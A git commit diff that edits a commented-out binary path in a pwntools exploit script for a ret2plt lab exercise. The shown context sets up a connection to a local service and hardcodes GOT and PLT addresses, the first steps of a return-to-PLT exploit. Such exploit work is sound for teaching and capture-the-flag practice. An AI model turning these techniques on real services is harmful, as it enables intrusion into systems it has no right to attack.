d3cf16b1e3936e827b82719e9d29200eb611d41f
YJK0805 <jerryko103@gmail.com>
2024-10-02 02:01:04 +0800

    edit ret2plt_adv exp

--- lab/exp/ret2plt_adv.py
+++ lab/exp/ret2plt_adv.py
@@ -1,6 +1,6 @@
 from pwn import *
 
-# r = process('../ret2libc_adv/share/ret2libc_adv')
+# r = process('../ret2plt_adv/share/ret2plt_adv')
 r = remote('127.0.0.1',10008)
 setvbuf_got = 0x404010
 puts_plt = 0x0000000000401030
